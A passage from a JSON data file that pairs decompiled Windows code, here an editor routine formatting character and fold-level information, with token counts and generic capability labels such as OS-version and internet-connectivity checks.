iVar11 = aiStack736[0];\n                                if ((0xfff < uStack712 * 2 + 2) &&\n                                   (iVar11 = *(aiStack736[0] + -8),  0x1f < (aiStack736[0] - iVar11) - 8U))\n                                goto code_r0x00018005e520;\n                                fcn.18008fb24(iVar11);\n                            }\n                            iVar33 = uStack784 - uStack800;\n                            uVar9 = fcn.180020b50(aiStack736, iVar33 + 1);\n                            piStack856 = CONCAT44(*0x180101904, *0x180101900);\n                            uStack848 = CONCAT44(*0x18010190c, *0x180101908);\n                            uStack872 = 0;\n                            uStack840 = uVar24 | 0x1000;\n                            fcn.18000d550(&uStack872, piVar20 + 0xf);\n                            puVar23 = &uStack528;\n                            if (7 < uStack504) {\n                                puVar23 = CONCAT62(Stack526, uStack528);\n                            }\n                            if (uStack848 - piStack856 < piVar20) {\n                                piStack888 = piVar20;\n                                fcn.180013690(&uStack872, piVar20, 0, puVar23);\n                                piVar20 = piStack512;\n                            }\n                            else {\n                                piVar16 = piStack856 + piVar20;\n                                puVar25 = &uStack872;\n                                if (7 < uStack848) {\n                                    puVar25 = CONCAT62(Stack870, uStack872);\n                                }\n                                puVar26 = puVar25 + piStack856;\n                                piStack856 = piVar16;\n                                fcn.1800ade80(puVar26, puVar23, piVar20 * 2);\n                                puVar25[piVar16] = 0;\n                            }\n                            if (uStack848 - piStack856 < 0xf) {\n                                piStack888 = 0xf;\n                                fcn.180013690(&uStack872, 0xf, 0, L\" Field Column: \");\n                            }\n                            else {\n                                piVar16 = piStack856 + 0xf;\n                                puVar23 = &uStack872;\n                                if (7 < uStack848) {\n                                    puVar23 = CONCAT62(Stack870, uStack872);\n                                }\n                                puVar25 = puVar23 + piStack856;\n                                piStack856 = piVar16;\n                                fcn.1800ade80(puVar25, L\" Field Column: \", 0x1e);\n                                puVar23[piVar16] = 0;\n                            }\n                            puVar17 = fcn.18002e490(&pppppppuStack832, &uStack872, uVar9);\n                            piVar16 = puVar17[2];\n                            if (7 < puVar17[3]) {\n                                puVar17 = *puVar17;\n                            }\n                            if (CONCAT44(uStack532, uStack536) - iStack544 < piVar16) {\n                                piStack888 = piVar16;\n                                fcn.180013690(&uStack560, piVar16, 0, puVar17);\n                            }\n                            else {\n                                iVar11 = iStack544 + piVar16;\n                                puVar23 = &uStack560;\n                                if (7 < CONCAT44(uStack532, uStack536)) {\n                                    puVar23 = CONCAT44(uStack556, CONCAT22(uStack560._2_2_, uStack560));\n                                }\n                                puVar25 = puVar23 + iStack544;\n                                iStack544 = iVar11;\n                                fcn.1800ade80(puVar25, puVar17, piVar16 * 2);\n                                puVar23[iVar11] = 0;\n                            }\n                            if (7 < uStack808) {\n                                pppppppuVar21 = pppppppuStack832;\n                                if ((0xfff < uStack808 * 2 + 2) &&\n                                   (pppppppuVar21 = pppppppuStack832[-1], \n                                   0x1f < pppppppuStack832 + (-8 - pppppppuVar21))) goto code_r0x00018005e526;\n                                fcn.18008fb24(pppppppuVar21);\n                            }\n                            piStack816 = CONCAT44(*0x180101904, *0x180101900);\n                            uStack808 = CONCAT44(*0x18010190c, *0x180101908);\n                            uVar9 = 0;\n                            pppppppuStack832 = pppppppuStack832 & 0xffffffffffff0000;\n                            if (7 < uStack848) {\n                                iVar10 = CONCAT62(Stack870, uStack872);\n                                iVar11 = iVar10;\n                                if ((0xfff < uStack848 * 2 + 2) &&\n                                   (iVar11 = *(iVar10 + -8),  0x1f < (iVar10 - iVar11) - 8U)) goto code_r0x00018005e52c;\n                                fcn.18008fb24(iVar11);\n                            }\n                            piStack856 = CONCAT44(*0x180101904, *0x180101900);\n                            uStack848 = CONCAT44(*0x18010190c, *0x180101908);\n                            uStack872 = 0;\n                            if (7 < uStack712) {\n                                iVar11 = aiStack736[0];\n                                if ((0xfff < uStack712 * 2 + 2) &&\n                                   (iVar11 = *(aiStack736[0] + -8),  0x1f < (aiStack736[0] - iVar11) - 8U))\n                                goto code_r0x00018005e532;\n                                fcn.18008fb24(iVar11);\n                            }\n                            piVar16 = piStack696;\n                            iVar19 = uStack800 + (uStack792 - uStack784);\n                            *(piStack696 + 0xc6) = iVar33 < iVar19;\n                            if (iVar33 < iVar19) {\n                                uVar9 = 5;\n                            }\n                            uVar14 = (**0x1800de798)(piStack696[3], 0x236c);\n                            (**0x1800de718)(uVar14, uVar9);\n                            uVar9 = 5;\n                            if (*(piVar16 + 0xc6) != '\\0') {\n                                uVar9 = 0;\n                            }\n                            uVar14 = (**0x1800de798)(piVar16[3], 0x2371);\n                            (**0x1800de718)(uVar14, uVar9);\n                            goto code_r0x00018005d72d;\n                        }\n                        iVar10 = CONCAT62(Stack870, uStack872);\n                        iVar11 = iVar10;\n                        if ((uStack848 * 2 + 2 < 0x1000) || (iVar11 = *(iVar10 + -8),  (iVar10 - iVar11) - 8U < 0x20)) {\n                            fcn.18008fb24(iVar11);\n                            goto code_r0x00018005cd13;\n                        }\n                        fcn.1800b3528();\ncode_r0x00018005e4f6:\n                        fcn.1800b3528();\ncode_r0x00018005e4fc:\n                        fcn.1800b3528();\ncode_r0x00018005e502:\n                        fcn.1800b3528();\ncode_r0x00018005e508:\n                        fcn.1800b3528();\ncode_r0x00018005e50e:\n                        fcn.1800b3528();\ncode_r0x00018005e514:\n                        fcn.1800b3528();\ncode_r0x00018005e51a:\n                        fcn.1800b3528();\ncode_r0x00018005e520:\n                        fcn.1800b3528();\ncode_r0x00018005e526:\n                        fcn.1800b3528();\ncode_r0x00018005e52c:\n                        fcn.1800b3528();\ncode_r0x00018005e532:\n                        fcn.1800b3528();\n                        goto code_r0x00018005e538;\n                    }\n                    pppppppuVar21 = pppppppuStack832;\n                    if ((uStack808 * 2 + 2 < 0x1000) ||\n                       (pppppppuVar21 = pppppppuStack832[-1],  pppppppuStack832 + (-8 - pppppppuVar21) < 0x20)) {\n                        fcn.18008fb24(pppppppuVar21);\n                        goto code_r0x00018005c91d;\n                    }\n                }\n                else {\n                    if (CONCAT44(uStack532, uStack536) < 8) {\ncode_r0x00018005c38d:\n                        uStack556 = puVar18[1];\n                        uStack552 = puVar18[2];\n                        uStack548 = puVar18[3];\n                        uStack560._0_2_ = *puVar18;\n                        uStack560._2_2_ = *puVar18 >> 0x10;\n                        iStack544 = *(puVar18 + 4);\n                        uStack536 = puVar18[6];\n                        uStack532 = puVar18[7];\n                        *(puVar18 + 4) = 0;\n                        *(puVar18 + 6) = 7;\n                        *puVar18 = 0;\n                        goto code_r0x00018005c3be;\n                    }\n                    iVar10 = CONCAT44(uStack556, CONCAT22(uStack560._2_2_, uStack560));\n                    iVar11 = iVar10;\n                    if ((CONCAT44(uStack532, uStack536) * 2 + 2 < 0x1000) ||\n                       (iVar11 = *(iVar10 + -8),  (iVar10 - iVar11) - 8U < 0x20)) {\n                        fcn.18008fb24(iVar11);\n                        goto code_r0x00018005c38d;\n                    }\ncode_r0x00018005e4ba:\n                    fcn.1800b3528();\ncode_r0x00018005e4c0:\n                    fcn.1800b3528();\ncode_r0x00018005e4c6:\n                    fcn.1800b3528();\ncode_r0x00018005e4cc:\n                    fcn.1800b3528();\ncode_r0x00018005e4d2:\n                    fcn.1800b3528();\ncode_r0x00018005e4d8:\n                    fcn.1800b3528();\n                }\n                fcn.1800b3528();\ncode_r0x00018005e4e4:\n                fcn.1800b3528();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            iVar10 = (**0x1800de7f0)(iVar11, 0x877, uStack680);\n            iVar11 = (**0x1800de7f0)(iVar11, 0x858);\n            if (iVar10 == iVar11) {\n                arg2_00 = L\"<Blank Line>\";\n                uVar9 = 0xc;\n            }\n            else {\n                arg2_00 = L\"<Unknown Record Type>\";\n                uVar9 = 0x15;\n            }\ncode_r0x00018005c29e:\n            fcn.180010d70(&uStack560, arg2_00, uVar9);\n            piVar20 = piStack512;\ncode_r0x00018005d72d:\n            iVar11 = iStack776;\n            uStack784 = (**0x1800de7f0)(iStack776, 0x7d7, iStack688);\n            uVar32 = uStack784 & 0xff;\n            uStack800 = uStack800 & 0xffffffff00000000 | uVar32;\n            if (uStack784 < '\\0') {\n                fcn.180020a90(aiStack456, 200, 0x1800fc2f4, uVar32);\n                auStack752._0_8_ = CONCAT44(*0x180101904, *0x180101900);\n                auStack752._0_12_ = CONCAT48(*0x180101908, auStack752._0_8_);\n                auStack752 = CONCAT412(*0x18010190c, auStack752._0_12_);\n                uStack768 = 0;\n                uStack767 = 0;\n                iVar10 = -1;\n                do {\n                    iVar10 = iVar10 + 1;\n                } while (aiStack456[iVar10] != 0);\n                fcn.180010d70(&uStack768, aiStack456, iVar10);\n                piStack856 = CONCAT44(*0x180101904, *0x180101900);\n                uStack848 = CONCAT44(*0x18010190c, *0x180101908);\n                uStack872 = 0;\n                uStack840 = uVar24 | 0x4000;\n                fcn.18000d550(&uStack872, piVar20 + 0xf);\n                puVar23 = &uStack528;\n                if (7 < uStack504) {\n                    puVar23 = CONCAT62(Stack526, uStack528);\n                }\n                if (uStack848 - piStack856 < piVar20) {\n                    piStack888 = piVar20;\n                    fcn.180013690(&uStack872, piVar20, 0, puVar23);\n                }\n                else {\n                    piVar16 = piStack856 + piVar20;\n                    puVar25 = &uStack872;\n                    if (7 < uStack848) {\n                        puVar25 = CONCAT62(Stack870, uStack872);\n                    }\n                    puVar26 = puVar25 + piStack856;\n                    piStack856 = piVar16;\n                    fcn.1800ade80(puVar26, puVar23, piVar20 * 2);\n                    puVar25[piVar16] = 0;\n                }\n                if (uStack848 - piStack856 < 0xf) {\n                    piStack888 = 0xf;\n                    fcn.180013690(&uStack872, 0xf, 0, L\"  UTF-8 Bytes: \");\n                }\n                else {\n                    piVar20 = piStack856 + 0xf;\n                    puVar23 = &uStack872;\n                    if (7 < uStack848) {\n                        puVar23 = CONCAT62(Stack870, uStack872);\n                    }\n                    puVar25 = puVar23 + piStack856;\n                    piStack856 = piVar20;\n                    fcn.1800ade80(puVar25, L\"  UTF-8 Bytes: \", 0x1e);\n                    puVar23[piVar20] = 0;\n                }\n                puVar17 = fcn.18002e490(&pppppppuStack832, &uStack872, &uStack768);\n                piVar20 = puVar17[2];\n                if (7 < puVar17[3]) {\n                    puVar17 = *puVar17;\n                }\n                if (CONCAT44(uStack532, uStack536) - iStack544 < piVar20) {\n                    piStack888 = piVar20;\n                    fcn.180013690(&uStack560, piVar20, 0, puVar17);\n                }\n                else {\n                    iVar10 = piVar20 + iStack544;\n                    puVar23 = &uStack560;\n                    if (7 < CONCAT44(uStack532, uStack536)) {\n                        puVar23 = CONCAT44(uStack556, CONCAT22(uStack560._2_2_, uStack560));\n                    }\n                    puVar25 = puVar23 + iStack544;\n                    iStack544 = iVar10;\n                    fcn.1800ade80(puVar25, puVar17, piVar20 * 2);\n                    puVar23[iVar10] = 0;\n                }\n                if (7 < uStack808) {\n                    pppppppuVar21 = pppppppuStack832;\n                    if ((uStack808 * 2 + 2 < 0x1000) ||\n                       (pppppppuVar21 = pppppppuStack832[-1],  pppppppuStack832 + (-8 - pppppppuVar21) < 0x20)) {\n                        fcn.18008fb24(pppppppuVar21);\n                        goto code_r0x00018005dc3e;\n                    }\n                    goto code_r0x00018005e54a;\n                }\ncode_r0x00018005dc3e:\n                piStack816 = CONCAT44(*0x180101904, *0x180101900);\n                uStack808 = CONCAT44(*0x18010190c, *0x180101908);\n                pppppppuStack832 = pppppppuStack832 & 0xffffffffffff0000;\n                uStack840 = uVar24;\n                if (uStack848 < 8) {\ncode_r0x00018005dc9e:\n                    piStack856 = CONCAT44(*0x180101904, *0x180101900);\n                    uStack848 = CONCAT44(*0x18010190c, *0x180101908);\n                    uStack872 = 0;\n                    if (7 < auStack752._8_8_) {\n                        iVar4 = CONCAT44(uStack764, CONCAT22(uStack766, CONCAT11(uStack767, uStack768)));\n                        iVar10 = iVar4;\n                        if ((0xfff < auStack752._8_8_ * 2 + 2) &&\n                           (iVar10 = *(iVar4 + -8),  0x1f < (iVar4 - iVar10) - 8U)) goto code_r0x00018005e556;\n                        fcn.18008fb24(iVar10);\n                    }\n                    iVar33 = uStack704;\n                    uVar6 = (**0x1800de7f0)(iVar11, 0x7d7, iVar33 + 1);\n                    fcn.180020a90(aiStack456, 200, 0x1800fce58, uVar6);\n                    piStack856 = CONCAT44(*0x180101904, *0x180101900);\n                    uStack848 = CONCAT44(*0x18010190c, *0x180101908);\n                    uStack872 = 0;\n                    iVar11 = -1;\n                    do {\n                        iVar11 = iVar11 + 1;\n                    } while (aiStack456[iVar11] != 0);\n                    fcn.180010d70(&uStack872, aiStack456, iVar11);\n                    uVar32 = uStack848;\n                    puVar23 = CONCAT62(Stack870, uStack872);\n                    puVar25 = &uStack872;\n                    if (7 < uStack848) {\n                        puVar25 = puVar23;\n                    }\n                    if (CONCAT44(uStack532, uStack536) - iStack544 < piStack856) {\n                        piStack888 = piStack856;\n                        fcn.180013690(&uStack560, piStack856, 0, puVar25);\n                        puVar23 = CONCAT62(Stack870, uStack872);\n                        uVar32 = uStack848;\n                    }\n                    else {\n                        iVar11 = piStack856 + iStack544;\n                        puVar26 = &uStack560;\n                        if (7 < CONCAT44(uStack532, uStack536)) {\n                            puVar26 = CONCAT44(uStack556, CONCAT22(uStack560._2_2_, uStack560));\n                        }\n                        puVar1 = puVar26 + iStack544;\n                        iStack544 = iVar11;\n                        fcn.1800ade80(puVar1, puVar25, piStack856 * 2);\n                        puVar26[iVar11] = 0;\n                        iVar33 = uStack704;\n                    }\n                    if (7 < uVar32) {\n                        puVar25 = puVar23;\n                        if ((uVar32 * 2 + 2 < 0x1000) || (puVar25 = *(puVar23 + -4),  puVar23 + (-8 - puVar25) < 0x20))\n                        {\n                            fcn.18008fb24(puVar25);\n                            goto code_r0x00018005de26;\n                        }\ncode_r0x00018005e4b4:\n                        fcn.1800b3528();\n                        goto code_r0x00018005e4ba;\n                    }\ncode_r0x00018005de26:\n                    iVar19 = (uStack800 & 0x1f) << 6;\n                    uVar8 = uVar6 & 0x3f;\n                    uVar6 = uStack784;\n                    if ((uVar6 & 0xe0) == 0xe0) {\n                        uVar7 = (**0x1800de7f0)(iStack776, 0x7d7, iVar33 + 2);\n                        uStack792._0_4_ = uVar7;\n                        uStack792 = uStack792 & 0xffffffff00000000 | uVar7;\n                        fcn.180020a90(aiStack456, 200, 0x1800fce50, uVar7);\n                        piStack856 = CONCAT44(*0x180101904, *0x180101900);\n                        uStack848 = CONCAT44(*0x18010190c, *0x180101908);\n                        uStack872 = 0;\n                        iVar11 = -1;\n                        do {\n                            iVar11 = iVar11 + 1;\n                        } while (aiStack456[iVar11] != 0);\n                        fcn.180010d70(&uStack872, aiStack456, iVar11);\n                        uVar32 = uStack848;\n                        puVar23 = CONCAT62(Stack870, uStack872);\n                        puVar25 = &uStack872;\n                        if (7 < uStack848) {\n                            puVar25 = puVar23;\n                        }\n                        if (CONCAT44(uStack532, uStack536) - iStack544 < piStack856) {\n                            piStack888 = piStack856;\n                            fcn.180013690(&uStack560, piStack856, 0, puVar25);\n                            puVar23 = CONCAT62(Stack870, uStack872);\n                            uVar32 = uStack848;\n                        }\n                        else {\n                            iVar11 = piStack856 + iStack544;\n                            puVar26 = &uStack560;\n                            if (7 < CONCAT44(uStack532, uStack536)) {\n                                puVar26 = CONCAT44(uStack556, CONCAT22(uStack560._2_2_, uStack560));\n                            }\n                            puVar1 = puVar26 + iStack544;\n                            iStack544 = iVar11;\n                            fcn.1800ade80(puVar1, puVar25, piStack856 * 2);\n                            puVar26[iVar11] = 0;\n                            uVar6 = uStack784;\n                        }\n                        if (7 < uVar32) {\n                            puVar25 = puVar23;\n                            if ((0xfff < uVar32 * 2 + 2) &&\n                               (puVar25 = *(puVar23 + -4),  0x1f < puVar23 + (-8 - puVar25))) goto code_r0x00018005e4b4;\n                            fcn.18008fb24(puVar25);\n                        }\n                        iVar19 = (uStack800 & 0xf) << 0xc;\n                        uVar8 = uVar8 * 0x40 + (uStack792 & 0x3f);\n                        if ((uVar6 & 0xf0) == 0xf0) {\n                            uVar6 = (**0x1800de7f0)(iStack776, 0x7d7, uStack704 + 3);\n                            uStack792._0_4_ = uVar6;\n                            uStack792 = uStack792 & 0xffffffff00000000 | uVar6;\n                            fcn.180020a90(aiStack456, 200, 0x1800fce78, uVar6);\n                            piStack856 = CONCAT44(*0x180101904, *0x180101900);\n                            uStack848 = CONCAT44(*0x18010190c, *0x180101908);\n                            uStack872 = 0;\n                            iVar11 = -1;\n                            do {\n                                iVar11 = iVar11 + 1;\n                            } while (aiStack456[iVar11] != 0);\n                            fcn.180010d70(&uStack872, aiStack456, iVar11);\n                            uVar32 = uStack848;\n                            puVar23 = CONCAT62(Stack870, uStack872);\n                            puVar25 = &uStack872;\n                            if (7 < uStack848) {\n                                puVar25 = puVar23;\n                            }\n                            if (CONCAT44(uStack532, uStack536) - iStack544 < piStack856) {\n                                piStack888 = piStack856;\n                                fcn.180013690(&uStack560, piStack856, 0, puVar25);\n                                puVar23 = CONCAT62(Stack870, uStack872);\n                                uVar32 = uStack848;\n                            }\n                            else {\n                                iVar11 = piStack856 + iStack544;\n                                puVar26 = &uStack560;\n                                if (7 < CONCAT44(uStack532, uStack536)) {\n                                    puVar26 = CONCAT44(uStack556, CONCAT22(uStack560._2_2_, uStack560));\n                                }\n                                puVar1 = puVar26 + iStack544;\n                                iStack544 = iVar11;\n                                fcn.1800ade80(puVar1, puVar25, piStack856 * 2);\n                                puVar26[iVar11] = 0;\n                            }\n                            if (7 < uVar32) {\n                                puVar25 = puVar23;\n                                if ((0xfff < uVar32 * 2 + 2) &&\n                                   (puVar25 = *(puVar23 + -4),  0x1f < puVar23 + (-8 - puVar25)))\n                                goto code_r0x00018005e4b4;\n                                fcn.18008fb24(puVar25);\n                            }\n                            iVar19 = (uStack800 & 7) << 0x12;\n                            uVar8 = uVar8 * 0x40 + (uStack792 & 0x3f);\n                        }\n                    }\n                    fcn.180020a90(aiStack456, 200, L\"  (U+%X)\", uVar8 + iVar19);\n                    piStack856 = CONCAT44(*0x180101904, *0x180101900);\n                    uStack848 = CONCAT44(*0x18010190c, *0x180101908);\n                    uStack872 = 0;\n                    do {\n                        iVar31 = iVar31 + 1;\n                    } while (aiStack456[iVar31] != 0);\n                    fcn.180010d70(&uStack872, aiStack456, iVar31);\n                    uVar32 = uStack848;\n                    puVar23 = CONCAT62(Stack870, uStack872);\n                    puVar25 = &uStack872;\n                    if (7 < uStack848) {\n                        puVar25 = puVar23;\n                    }\n                    if (CONCAT44(uStack532, uStack536) - iStack544 < piStack856) {\n                        piStack888 = piStack856;\n                        fcn.180013690(&uStack560, piStack856, 0, puVar25);\n                        puVar23 = CONCAT62(Stack870, uStack872);\n                        uVar32 = uStack848;\n                    }\n                    else {\n                        iVar31 = piStack856 + iStack544;\n                        puVar26 = &uStack560;\n                        if (7 < CONCAT44(uStack532, uStack536)) {\n                            puVar26 = CONCAT44(uStack556, CONCAT22(uStack560._2_2_, uStack560));\n                        }\n                        puVar1 = puVar26 + iStack544;\n                        iStack544 = iVar31;\n                        fcn.1800ade80(puVar1, puVar25, piStack856 * 2);\n                        puVar26[iVar31] = 0;\n                    }\n                    iVar11 = iStack776;\n                    if (7 < uVar32) {\n                        puVar25 = puVar23;\n                        if ((0xfff < uVar32 * 2 + 2) && (puVar25 = *(puVar23 + -4),  0x1f < puVar23 + (-8 - puVar25)))\n                        goto code_r0x00018005e4b4;\n                        fcn.18008fb24(puVar25);\n                        iVar11 = iStack776;\n                    }\n                    goto code_r0x00018005e1ed;\n                }\n                iVar4 = CONCAT62(Stack870, uStack872);\n                iVar10 = iVar4;\n                if ((uStack848 * 2 + 2 < 0x1000) || (iVar10 = *(iVar4 + -8),  (iVar4 - iVar10) - 8U < 0x20)) {\n                    fcn.18008fb24(iVar10);\n                    goto code_r0x00018005dc9e;\n                }\n            }\n            else {\n                piStack888 = piStack888 & 0xffffffff00000000 | uVar32;\n                fcn.180020a90(aiStack456, 200, L\"0x%X [%u]\", uVar32);\n                auStack752._0_8_ = CONCAT44(*0x180101904, *0x180101900);\n                auStack752._0_12_ = CONCAT48(*0x180101908, auStack752._0_8_);\n                auStack752 = CONCAT412(*0x18010190c, auStack752._0_12_);\n                uStack768 = 0;\n                uStack767 = 0;\n                do {\n                    iVar31 = iVar31 + 1;\n                } while (aiStack456[iVar31] != 0);\n                fcn.180010d70(&uStack768, aiStack456, iVar31);\n                piStack856 = CONCAT44(*0x180101904, *0x180101900);\n                uStack848 = CONCAT44(*0x18010190c, *0x180101908);\n                uStack872 = 0;\n                uStack840 = uVar24 | 0x2000;\n                fcn.18000d550(&uStack872, piVar20 + 0xf);\n                puVar23 = &uStack528;\n                if (7 < uStack504) {\n                    puVar23 = CONCAT62(Stack526, uStack528);\n                }\n                if (uStack848 - piStack856 < piVar20) {\n                    piStack888 = piVar20;\n                    fcn.180013690(&uStack872, piVar20, 0, puVar23);\n                }\n                else {\n                    piVar16 = piStack856 + piVar20;\n                    puVar25 = &uStack872;\n                    if (7 < uStack848) {\n                        puVar25 = CONCAT62(Stack870, uStack872);\n                    }\n                    puVar26 = puVar25 + piStack856;\n                    piStack856 = piVar16;\n                    fcn.1800ade80(puVar26, puVar23, piVar20 * 2);\n                    puVar25[piVar16] = 0;\n                }\n                if (uStack848 - piStack856 < 0xf) {\n                    piStack888 = 0xf;\n                    fcn.180013690(&uStack872, 0xf, 0, L\"    ANSI Byte: \");\n                }\n                else {\n                    piVar20 = piStack856 + 0xf;\n                    puVar23 = &uStack872;\n                    if (7 < uStack848) {\n                        puVar23 = CONCAT62(Stack870, uStack872);\n                    }\n                    puVar25 = puVar23 + piStack856;\n                    piStack856 = piVar20;\n                    fcn.1800ade80(puVar25, L\"    ANSI Byte: \", 0x1e);\n                    puVar23[piVar20] = 0;\n                }\n                puVar17 = fcn.18002e490(&pppppppuStack832, &uStack872, &uStack768);\n                piVar20 = puVar17[2];\n                if (7 < puVar17[3]) {\n                    puVar17 = *puVar17;\n                }\n                if (CONCAT44(uStack532, uStack536) - iStack544 < piVar20) {\n                    piStack888 = piVar20;\n                    fcn.180013690(&uStack560, piVar20, 0, puVar17);\n                }\n                else {\n                    iVar31 = piVar20 + iStack544;\n                    puVar23 = &uStack560;\n                    if (7 < CONCAT44(uStack532, uStack536)) {\n                        puVar23 = CONCAT44(uStack556, CONCAT22(uStack560._2_2_, uStack560));\n                    }\n                    puVar25 = puVar23 + iStack544;\n                    iStack544 = iVar31;\n                    fcn.1800ade80(puVar25, puVar17, piVar20 * 2);\n                    puVar23[iVar31] = 0;\n                }\n                if (uStack808 < 8) {\ncode_r0x00018005d972:\n                    piStack816 = CONCAT44(*0x180101904, *0x180101900);\n                    uStack808 = CONCAT44(*0x18010190c, *0x180101908);\n                    pppppppuStack832 = pppppppuStack832 & 0xffffffffffff0000;\n                    uStack840 = uVar24;\n                    if (7 < uStack848) {\n                        iVar10 = CONCAT62(Stack870, uStack872);\n                        iVar31 = iVar10;\n                        if ((0xfff < uStack848 * 2 + 2) && (iVar31 = *(iVar10 + -8),  0x1f < (iVar10 - iVar31) - 8U))\n                        goto code_r0x00018005e53e;\n                        fcn.18008fb24(iVar31);\n                    }\n                    piStack856 = CONCAT44(*0x180101904, *0x180101900);\n                    uStack848 = CONCAT44(*0x18010190c, *0x180101908);\n                    uStack872 = 0;\n                    if (7 < auStack752._8_8_) {\n                        iVar10 = CONCAT44(uStack764, CONCAT22(uStack766, CONCAT11(uStack767, uStack768)));\n                        iVar31 = iVar10;\n                        if ((0xfff < auStack752._8_8_ * 2 + 2) &&\n                           (iVar31 = *(iVar10 + -8),  0x1f < (iVar10 - iVar31) - 8U)) goto code_r0x00018005e544;\n                        fcn.18008fb24(iVar31);\n                    }\ncode_r0x00018005e1ed:\n                    piVar20 = piStack696;\n                    puVar23 = &uStack560;\n                    if (7 < CONCAT44(uStack532, uStack536)) {\n                        puVar23 = CONCAT44(uStack556, CONCAT22(uStack560._2_2_, uStack560));\n                    }\n                    (**0x1800de778)(piStack696[0x13], puVar23);\n                    fcn.180056030(piVar20);\n                    auStack752 = CONCAT88(0xf, SUB168(auStack752, 0));\n                    uStack768 = 0;\n                    arg1_01 = &uStack768;\n                    fcn.180011120(arg1_01, 0x1800fcea8, 0xb);\n                    cVar5 = fcn.180007d40(arg1_01, &uStack768);\n                    if (cVar5 != '\\0') {\n                        uVar8 = (**0x1800de7f0)(iVar11, 0x8af, uStack680);\n                        if (0 < uVar8) {\n                            uVar22 = uVar8 - 0x400 & 0xfff;\n                            uVar32 = uVar22;\n                            if ((uVar8 >> 0xd & 1) == 0) {\n                                uVar9 = fcn.180020b50(&uStack768, uVar32);\n                                uStack840 = uVar24 | 4;\n                                puVar18 = fcn.180014b80(uVar9, uVar32, L\"\\n   Fold Level: \", 0x10);\n                                uStack636 = puVar18[1];\n                                uStack632 = puVar18[2];\n                                uStack628 = puVar18[3];\n                                uStack640 = *puVar18;\n                                uStack638 = *puVar18 >> 0x10;\n                                auStack624 = *(puVar18 + 4);\n                                *(puVar18 + 4) = 0;\n                                *(puVar18 + 6) = 7;\n                                *puVar18 = 0;\n                                puVar23 = &uStack640;\n                                uVar24 = uVar24 | 0x1000c;\n                            }\n                            else {\n                                uVar32 = uVar22 + 1;\n                                uVar9 = fcn.180020b50(&uStack872, uVar32);\n                                uStack840 = uVar24 | 1;\n                                puVar18 = fcn.180014b80(uVar9, uVar32, L\"\\n  Fold Header: \", 0x10);\n                                uStack668 = puVar18[1];\n                                uStack664 = puVar18[2];\n                                uStack660 = puVar18[3];\n                                uStack672 = *puVar18;\n                                uStack670 = *puVar18 >> 0x10;\n                                auStack656 = *(puVar18 + 4);\n                                *(puVar18 + 4) = 0;\n                                *(puVar18 + 6) = 7;\n                                *puVar18 = 0;\n                                puVar23 = &uStack672;\n                                uVar24 = uVar24 | 0x8003;\n                            }\n                            piStack816 = CONCAT44(*0x180101904, *0x180101900);\n                            uStack808 = CONCAT44(*0x18010190c, *0x180101908);\n                            pppppppuStack832 = pppppppuStack832 & 0xffffffffffff0000;\n                            uStack840 = uVar24;\n                            fcn.180010c20(&pppppppuStack832, 0x28);\n                            uVar9 = fcn.180013190(&pppppppiStack608, 0x1800f94bc, &pppppppuStack832);\n                            uVar9 = fcn.18002e490(aiStack736, uVar9, puVar23);\n                            fcn.18000d8d0(&uStack560, uVar9);\n                            fcn.180003e40(aiStack736);\n                            fcn.180003e40(&pppppppiStack608);\n                            fcn.180003e40(&pppppppuStack832);\n                            if ((uVar24 & 8) != 0) {\n                                uVar24 = uVar24 & 0xfffffff7;\n                                fcn.180003e40(&uStack640);\n                            }\n                            if ((uVar24 & 4) != 0) {\n                                uVar24 = uVar24 & 0xfffffffb;\n                                fcn.180003e40(&uStack768);\n                            }\n                            if ((uVar24 & 2) != 0) {\n                                uVar24 = uVar24 & 0xfffffffd;\n                                fcn.180003e40(&uStack672);\n                            }\n                            if ((uVar24 & 1) != 0) {\n                                fcn.180003e40(&uStack872);\n                            }\n                        }\n                        uVar9 = fcn.180067b20(aiStack736, &uStack560);\n                        fcn.18000dd60(piVar20 + 0x1a, uVar9);\n                        fcn.18000dd00(aiStack736);\n                        uVar9 = fcn.18000dc20(piVar20 + 0x1a);\n                        (**0x1800de698)(iVar11, 0x898, iStack688, uVar9);\n                    }\n                    goto code_r0x00018005e461;\n                }\n                pppppppuVar21 = pppppppuStack832;\n                if ((uStack808 * 2 + 2 < 0x1000) ||\n                   (pppppppuVar21 = pppppppuStack832[-1],  pppppppuStack832 + (-8 - pppppppuVar21) < 0x20)) {\n                    fcn.18008fb24(pppppppuVar21);\n                    goto code_r0x00018005d972;\n                }\ncode_r0x00018005e538:\n                fcn.1800b3528();\ncode_r0x00018005e53e:\n                fcn.1800b3528();\ncode_r0x00018005e544:\n                fcn.1800b3528();\ncode_r0x00018005e54a:\n                fcn.1800b3528();\n            }\n            fcn.1800b3528();\ncode_r0x00018005e556:\n            fcn.1800b3528();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.180056030(arg1);\n        (**0x1800de778)(arg1[0x13], 0x1800f8dbc);\ncode_r0x00018005e461:\n        fcn.180003e40(&uStack528);\n        fcn.180003e40(&uStack560);\n    }\n    fcn.18000dd00(auStack496);\ncode_r0x00018005e484:\n    fcn.18008fb00(var_bp_30h ^ auStack920);\n    return;\n}\n",
        "token_count": 19215
    },
    "18005f9c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
